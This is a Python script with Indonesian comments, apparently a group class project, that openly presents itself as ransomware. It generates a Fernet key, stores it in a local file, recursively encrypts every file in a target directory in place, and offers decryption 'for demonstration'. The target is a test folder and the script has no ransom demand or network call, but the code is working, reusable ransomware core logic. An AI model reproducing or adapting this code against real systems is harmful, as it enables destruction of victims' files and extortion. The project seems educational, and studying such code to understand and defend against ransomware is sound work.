# ADIT ===========================================================================================================================================

import os
from cryptography.fernet import Fernet

# Menghasilkan kunci enkripsi dan menyimpannya ke dalam file
def generate_key():
    key = Fernet.generate_key() # Membuat kunci enkripsi unik menggunakan Fernet
    with open("kunci_ransomware.key", "wb") as key_file: # Membuka/menyimpan kunci dalam file biner
        key_file.write(key) # Menulis kunci ke file

# memuat kunci enkripsi dari file
def load_key():
    return open("kunci_ransomware.key", "rb").read() # Membaca kunci dari file biner




# DANIEL ==========================================================================================================================================

# Enkripsi file
def encrypt_file(file_path, key):
    fernet = Fernet(key) # Menginisialisasi metode enkripsi dengan kunci
    with open(file_path, "rb") as file:
        file_data = file.read() # Membaca data dari file
    encrypted_data = fernet.encrypt(file_data) # Melakukan enkripsi pada data
    with open(file_path, "wb") as file:
        file.write(encrypted_data) # Menulis data terenkripsi kembali ke file
    print(f"- {file_path} has been encrypted.") # Success encryption

# Mengenkripsi semua file dalam direktori secara rekursif
def encrypt_file_in_directory(directory, key):
    for root, dirs, files in os.walk(directory): # Melakukan iterasi pada semua file di dalam direktori
        for file in files:
            file_path = os.path.join(root, file) # Mendapatkan jalur lengkap file
            encrypt_file(file_path, key) # Melakukan enkripsi pada setiap file




# SADRAKH ===========================================================================================================================================

# Dekripsi file
def decrypt_file(file_path, key):
    fernet = Fernet(key) # Menginisialisasi metode dekripsi dengan kunci
    with open(file_path, "rb") as file:
        encrypted_data = file.read() # Membaca data terenkripsi dari file
    decrypted_data = fernet.decrypt(encrypted_data) # Melakukan dekripsi pada data
    with open(file_path, "wb") as file:
        file.write(decrypted_data) # Menulis data terdekripsi kembali ke file
    print(f"- {file_path} has been decrypted.") # Success description




# RENDY ===========================================================================================================================================

# Bagian utama program main
if __name__ == "__main__":
    target_directory = "testing_folder" # Menentukan direktori target untuk enkripsi

    # Jika kunci enkripsi belum ada, buat kunci baru
    if not os.path.exists("kunci_ransomware.key"):
        generate_key() # Membuat kunci enkripsi
        print("- Encryption key generated.") # Log pembuatan kunci

    key = load_key() # Memuat kunci enkripsi dari file
    print("- Key loaded, encrypting file...")

    # Meminta user untuk memilih aksi (enkripsi atau dekripsi)
    action = input("Choose action (Encrypt/Decrypt): ").strip().lower()

    if action == 'encrypt':
        encrypt_file_in_directory(target_directory, key) # Melakukan enkripsi pada semua file dalam direktori
    elif action == 'decrypt':
        # Mendekripsi file sebagai demonstrasi
        print("- Decrypting files for demonstartion purposes...")
        for root, dirs, files in os.walk(target_directory): # Melakukan iterasi pada semua file di dalam direktori
            for file in files:
                file_path = os.path.join(root, file) # Mendapatkan jalur lengkap file
                decrypt_file(file_path, key) # Melakukan dekripsi pada file
    else:
        print("Input anda invalid! Masukan 'Encrypt' atau 'Decrypt' ya.")
